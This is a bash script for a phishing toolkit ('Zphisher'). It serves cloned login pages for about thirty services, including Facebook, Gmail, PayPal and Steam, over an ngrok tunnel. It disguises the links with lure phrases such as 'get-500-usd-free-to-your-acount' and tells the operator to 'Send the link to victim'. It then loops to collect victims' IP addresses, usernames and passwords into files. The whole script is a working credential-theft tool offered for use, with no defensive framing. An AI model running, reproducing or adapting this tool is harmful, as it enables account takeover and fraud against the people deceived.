#!/bin/bash

trap 'printf "\n";stop;exit 1' 2
trap user_interrupt SIGINT
trap user_interrupt SIGTSTP

user_interrupt(){
        printf "\e[0m\n"
        printf "\e[0m\e[1;36m\t Exiting !!\n"
        sleep 2
        printf "\e[0m\n"
        exit 1
}

stop() {

checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall php > /dev/null 2>&1
fi
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall ngrok > /dev/null 2>&1
fi

}

banner() {

clear
printf "      \e[33;1m ______      _     _     _               \e[0m\n"
printf "      \e[33;1m|___  /     | |   (_)   | |              \e[0m\n"
printf "      \e[33;1m   / / _ __ | |__  _ ___| |__   ___ _ __ \e[0m\n"
printf "      \e[32;1m  / /\e[33;1m | '_ \| '_ \| / __| '_ \ / _ \ '__|\e[0m\n"
printf "      \e[32;1m / /__| |_) | | | | \__ \ | | |  __/ |   \e[0m\n"
printf "      \e[32;1m/_____| .__/|_| |_|_|___/_| |_|\___|_|   \e[0m\n"
printf "      \e[33;1m      | |                                \e[0m\n"
printf "      \e[33;1m      |_|           \e[1;97m    Version 2.1 Beta      \e[0m\n"
printf "\n"
printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by htr-tech (tahmid.rayat)\e[0m\n"
printf "\n"

}


reqs() {

printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Installing packages..\e[0m\n"
command -v php > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Installing php\e[0m\n\n"; apt-get install php -y; }
command -v curl > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Installing php\e[0m\n\n"; apt-get install curl -y; }
command -v wget > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Installing wget\e[0m\n\n"; apt-get install wget -y; }
command -v unzip > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Installing unzip\e[0m\n\n"; apt-get install zip unzip -y; }

if [[ -d .htr ]]; then
printf ""
else
mkdir .htr
fi

if [[ -e Modules.zip ]]; then
unzip -qq Modules.zip
rm Modules.zip
fi

if [[ -e .htr/ngrok ]]; then
printf ""
else
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok..\e[0m\n"
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
mv -f ngrok .htr > /dev/null 2>&1
rm -rf ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x .htr/ngrok > /dev/null 2>&1
else
printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
exit 1
fi
else
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok..\e[0m\n"
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
mv -f ngrok .htr > /dev/null 2>&1
rm -rf ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x .htr/ngrok > /dev/null 2>&1
else
printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
exit 1
fi
fi
fi

if [[ -e .htr/ngrok2 ]]; then
printf ""
else
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok Patch..\e[0m\n"
wget --no-check-certificate https://bin.equinox.io/a/nmkK3DkqZEB/ngrok-2.2.8-linux-arm64.zip > /dev/null 2>&1
if [[ -e ngrok-2.2.8-linux-arm64.zip ]]; then
unzip ngrok-2.2.8-linux-arm64.zip > /dev/null 2>&1
mv -f ngrok .htr/ngrok2  > /dev/null 2>&1
rm -rf ngrok-2.2.8-linux-arm64.zip  > /dev/null 2>&1
chmod +x .htr/ngrok2  > /dev/null 2>&1
else
printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
exit 1
fi
else
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok Patch..\e[0m\n"
wget --no-check-certificate https://bin.equinox.io/a/4hREUYJSmzd/ngrok-2.2.8-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-2.2.8-linux-386.zip ]]; then
unzip ngrok-2.2.8-linux-386.zip > /dev/null 2>&1
mv -f ngrok .htr/ngrok2
rm -rf ngrok-2.2.8-linux-386.zip
chmod +x .htr/ngrok2
else
printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
exit 1
fi
fi
fi

if [[ -d .htr/www ]]; then
rm -rf .htr/www
mkdir .htr/www
else
mkdir .htr/www
fi

}

menu() {

banner
printf "      \e[0m\e[1;46m[::]  Select Any Attack for Your Victim  [::]\e[0m\n"
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Facebook    \e[0m\e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;93m Twitch      \e[0m\e[1;31m[\e[0m\e[1;77m21\e[0m\e[1;31m]\e[0m\e[1;93m DeviantArt	\e[0m\e[1;31m[\e[0m\e[1;77m99\e[0m\e[1;31m]\e[0m\e[1;93m About\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Instagram   \e[0m\e[1;31m[\e[0m\e[1;77m12\e[0m\e[1;31m]\e[0m\e[1;93m Pinterest   \e[0m\e[1;31m[\e[0m\e[1;77m22\e[0m\e[1;31m]\e[0m\e[1;93m Badoo		\e[0m\e[1;31m[\e[0m\e[1;77m00\e[0m\e[1;31m]\e[0m\e[1;93m Exit\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Google      \e[0m\e[1;31m[\e[0m\e[1;77m13\e[0m\e[1;31m]\e[0m\e[1;93m Snapchat    \e[0m\e[1;31m[\e[0m\e[1;77m23\e[0m\e[1;31m]\e[0m\e[1;93m Origin\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Microsoft   \e[0m\e[1;31m[\e[0m\e[1;77m14\e[0m\e[1;31m]\e[0m\e[1;93m Linkedin    \e[0m\e[1;31m[\e[0m\e[1;77m24\e[0m\e[1;31m]\e[0m\e[1;93m CryptoCoin\e[0m\n"	
printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Netflix     \e[0m\e[1;31m[\e[0m\e[1;77m15\e[0m\e[1;31m]\e[0m\e[1;93m Ebay        \e[0m\e[1;31m[\e[0m\e[1;77m25\e[0m\e[1;31m]\e[0m\e[1;93m Yahoo	\e[0m\n"	
printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m Paypal      \e[0m\e[1;31m[\e[0m\e[1;77m16\e[0m\e[1;31m]\e[0m\e[1;93m Dropbox     \e[0m\e[1;31m[\e[0m\e[1;77m26\e[0m\e[1;31m]\e[0m\e[1;93m Wordpress\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Steam       \e[0m\e[1;31m[\e[0m\e[1;77m17\e[0m\e[1;31m]\e[0m\e[1;93m Protonmail  \e[0m\e[1;31m[\e[0m\e[1;77m27\e[0m\e[1;31m]\e[0m\e[1;93m Yandex	\e[0m\n"		
printf " \e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;93m Twitter     \e[0m\e[1;31m[\e[0m\e[1;77m18\e[0m\e[1;31m]\e[0m\e[1;93m Spotify     \e[0m\e[1;31m[\e[0m\e[1;77m28\e[0m\e[1;31m]\e[0m\e[1;93m StackoverFlow\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;93m Playstation \e[0m\e[1;31m[\e[0m\e[1;77m19\e[0m\e[1;31m]\e[0m\e[1;93m Reddit      \e[0m\e[1;31m[\e[0m\e[1;77m29\e[0m\e[1;31m]\e[0m\e[1;93m Vk\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;93m Github      \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;93m Adobe       \e[0m\e[1;31m[\e[0m\e[1;77m30\e[0m\e[1;31m]\e[0m\e[1;93m XBOX\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' menu_option

if [[ $menu_option == 1 || $menu_option == 01 ]]; then
facebook
elif [[ $menu_option == 2 || $menu_option == 02 ]]; then
instagram
elif [[ $menu_option == 3 || $menu_option == 03 ]]; then
gmail
elif [[ $menu_option == 4 || $menu_option == 04 ]]; then
website="microsoft"
mask='unlimited-onedrive-space-for free'
tunnel_menu
elif [[ $menu_option == 5 || $menu_option == 05 ]]; then
website="netflix"
mask='upgrade-your-netflix-plan-free'
tunnel_menu
elif [[ $menu_option == 6 || $menu_option == 06 ]]; then
website="paypal"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_option == 7 || $menu_option == 07 ]]; then
website="steam"
mask='steam-500-usd-gift-card-free'
tunnel_menu
elif [[ $menu_option == 8 || $menu_option == 08 ]]; then
website="twitter"
mask='get-blue-badge-on-twitter-free'
tunnel_menu
elif [[ $menu_option == 9 || $menu_option == 09 ]]; then
website="playstation"
mask='playstation-500-usd-gift-card-free'
tunnel_menu
elif [[ $menu_option == 10 ]]; then
website="github"
mask='get-github-pro-features-free-lifetime'
tunnel_menu
elif [[ $menu_option == 11 ]]; then
website="twitch"
mask='unlimited-twitch-tv-user-for-free'
tunnel_menu
elif [[ $menu_option == 12 ]]; then
website="pinterest"
mask='get-a-premium-plan-for-pinterest-free'
tunnel_menu
elif [[ $menu_option == 13 ]]; then
website="snapchat"
mask='view-locked-snapchat-accounts-secretly'
tunnel_menu
elif [[ $menu_option == 14 ]]; then
website="linkedin"
mask='get-a-premium-plan-for-linkedin-free'
tunnel_menu
elif [[ $menu_option == 15 ]]; then
website="ebay"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_option == 16 ]]; then
website="dropbox"
mask='get-500-gb-free-to-your-acount'
tunnel_menu
elif [[ $menu_option == 17 ]]; then
website="protonmail"
mask='protonmail-pro-basics-for-free'
tunnel_menu
elif [[ $menu_option == 18 ]]; then
website="spotify"
mask='convert-your-account-to-spotify-premium'
tunnel_menu
elif [[ $menu_option == 19 ]]; then
website="reddit"
mask='reddit-official-verified-member-badge'
tunnel_menu
elif [[ $menu_option == 20 ]]; then
website="adobe"
mask='get-adobe-lifetime-pro-membership-free'
tunnel_menu
elif [[ $menu_option == 21 ]]; then
website="deviantart"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_option == 22 ]]; then
website="badoo"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_option == 23 ]]; then
website="origin"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_option == 24 ]]; then
website="cryptocoinsniper"
mask='get-500-btc-free-to-your-acount'
tunnel_menu
elif [[ $menu_option == 25 ]]; then
website="yahoo"
mask='grab-mail-from-anyother-yahoo-account-free'
tunnel_menu
elif [[ $menu_option == 26 ]]; then
website="wordpress"
mask='unlimited-wordpress-traffic-free'
tunnel_menu
elif [[ $menu_option == 27 ]]; then
website="yandex"
mask='grab-mail-from-anyother-yandex-account-free'
tunnel_menu
elif [[ $menu_option == 28 ]]; then
website="stackoverflow"
mask='get-stackoverflow-lifetime-pro-membership-free'
tunnel_menu
elif [[ $menu_option == 29 ]]; then
vk
elif [[ $menu_option == 30 ]]; then
website="xbox"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_option == 99 ]]; then
about
elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
printf "\e[0m\n"
printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/htr-tech for more\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

facebook(){

printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Messenger Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option

if [[ $fb_option == 1 || $fb_option == 01 ]]; then
website="facebook"
mask='blue-verified-badge-for-facebook-free'
tunnel_menu
elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
website="fb_advanced"
mask='vote-for-the-best-social-media'
tunnel_menu
elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
website="fb_security"
mask='make-your-facebook-secured-and-free-from-hackers'
tunnel_menu
elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
website="fb_messenger"
mask='get-messenger-premium-features-free'
tunnel_menu

else
printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

instagram(){

printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Auto Followers Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Blue Badge Verify Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' ig_option

if [[ $ig_option == 1 || $ig_option == 01 ]]; then
website="instagram"
mask='get-unlimited-followers-for-instagram'
tunnel_menu
elif [[ $ig_option == 2 || $ig_option == 02 ]]; then
website="ig_followers"
mask='get-unlimited-followers-for-instagram'
tunnel_menu
elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
website="ig_verify"
mask='blue-badge-verify-for-instagram-free'
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

gmail(){

printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Gmail Old Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Gmail New Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' gmail_option

if [[ $gmail_option == 1 || $gmail_option == 01 ]]; then
website="google"
mask='get-unlimited-google-drive-free'
tunnel_menu
elif [[ $gmail_option == 2 || $gmail_option == 02 ]]; then
website="google_new"
mask='get-unlimited-google-drive-free'
tunnel_menu
elif [[ $gmail_option == 3 || $gmail_option == 03 ]]; then
website="google_poll"
mask='vote-for-the-best-social-media'
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

vk(){

printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' vk_option

if [[ $vk_option == 1 || $vk_option == 01 ]]; then
website="vk"
mask='vk-premium-real-method-2020'
tunnel_menu
elif [[ $vk_option == 2 || $vk_option == 02 ]]; then
website="vk_poll"
mask='vote-for-the-best-social-media'
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}


about() {

clear
banner
printf "\e[0m\n"
printf "\e[0m\e[92m  AUTHOR \e[0m\e[91m     :\e[0m\e[93m TAHMID RAYAT \e[0m\e[91m[\e[0m\e[93m HTR-TECH \e[0m\e[91m]\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  GITHUB \e[0m\e[91m     : \e[0m\e[96mhttps://github.com/htr-tech\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  Social \e[0m\e[91m     : \e[0m\e[96mhttps://linktr.ee/tahmid.rayat\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[92m  Version \e[0m\e[91m    : \e[0m\e[93m2.1 Beta\e[0m\n"
printf "\e[0m\n"
printf "   \e[0m\e[41mThanks to MoisesTapia , Hiddeneye Team & Thelinuxchoice\e[0m\n"
printf "\e[0m\n"
printf "         \e[0m\e[1;44m Follow Our Github For More Tools \e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
sleep 3
printf " \e[0m\e[91m[\e[0m00\e[0m\e[91m]\e[0m\e[93m Home           \e[0m\e[91m[\e[0m99\e[0m\e[91m]\e[0m\e[93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' about_option

if [[ $about_option == 0 || $about_option == 00 ]]; then
sleep 1
banner
menu
elif [[ $about_option == 99 ]]; then
sleep 1
printf "\e[0m\n"
printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/htr-tech for more\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}

tunnel_menu() {

if [[ -d .htr/www ]]; then
rm -rf .htr/www
mkdir .htr/www
else
mkdir .htr/www
fi

cp -rf .Modules/$website/* .htr/www
cp -f .Modules/ip.php .htr/www/

def_tunnel_menu="2"
banner
printf "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[93m LocalHost \e[0m\e[91m[\e[0m\e[96mDevs Only\e[0m\e[91m]\e[0m\n"
printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[93m Ngrok.io \e[0m\e[91m[\e[0m\e[96mHotspot Required\e[0m\e[91m]\e[0m\n"
printf "\e[0m\e[91m [\e[0m03\e[0m\e[91m]\e[0m\e[93m Ngrok.io \e[0m\e[91m[\e[0m\e[96mWithout Hotspot\e[0m\e[91m]\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' tunnel_menu
tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"

if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
start_localhost
elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
start_ngrok
elif [[ $tunnel_menu == 3 || $tunnel_menu == 03 ]]; then
start_ngrok2

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

validate() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            printf "\n\e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m  Ngrok was unable to Generate Link.. Try Again..\e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\n\n"
            exit 1
        fi
    fi
}

start_ngrok() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ..Turn on Hotspot..\e[0m\n"
cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
./.htr/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 5
ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
validate $ngrok_link
linker=$(curl -s https://da.gd/s/?url=${ngrok_link})
validate $linker
linker2=${linker#https://}
sleep 3
banner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $mask@$linker2
datafound

}

start_ngrok2() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok Patched ...\e[0m\n"
cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
./.htr/ngrok2 http 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 5
ngrok_link2=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
validate $ngrok_link2
linker1=$(curl -s https://da.gd/s/?url=${ngrok_link2})
validate $linker1
linker21=${linker1#https://}
sleep 3
banner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $mask@$linker21
datafound

}


start_localhost() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://127.0.0.1:5555 \e[0m\e[1;92m)\e[0m\n"
cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
banner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://127.0.0.1:5555\e[0m\n"
datafound

}

grab_ip() {

ip=$(grep -a 'IP:' .htr/www/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m ip.txt\e[0m\n"
printf "\n"
cat .htr/www/ip.txt >> ip.txt

}

grab_creds() {

account=$(grep -o 'Username:.*' .htr/www/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat .htr/www/usernames.txt >> usernames.dat
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m usernames.dat\e[0m\n"
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"

}

datafound() {

printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
printf "\n"
while [ true ]; do

if [[ -e ".htr/www/ip.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found ! \e[0m\n"
grab_ip
rm -rf .htr/www/ip.txt
fi
sleep 0.75
if [[ -e ".htr/www/usernames.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !! \e[0m\n"
grab_creds
rm -rf .htr/www/usernames.txt
fi
sleep 0.75
done 

}


banner
reqs
menu
